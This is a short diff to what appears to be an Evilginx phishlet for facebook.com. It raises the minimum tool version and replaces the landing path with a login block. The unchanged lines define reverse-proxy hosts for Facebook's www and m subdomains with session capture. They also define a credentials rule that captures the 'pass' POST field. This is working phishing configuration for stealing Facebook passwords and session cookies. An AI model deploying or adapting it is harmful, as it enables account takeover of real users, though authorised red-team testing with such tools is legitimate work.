@@ -1,5 +1,5 @@
 author: '@mrgretzky'
-min_ver: '2.2.0'
+min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
   - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
@@ -25,5 +25,6 @@ credentials:
     key: 'pass'
     search: '(.*)'
     type: 'post'
-landing_path:
-  - '/login.php'
+login:
+  domain: 'www.facebook.com'
+  path: '/login.php'
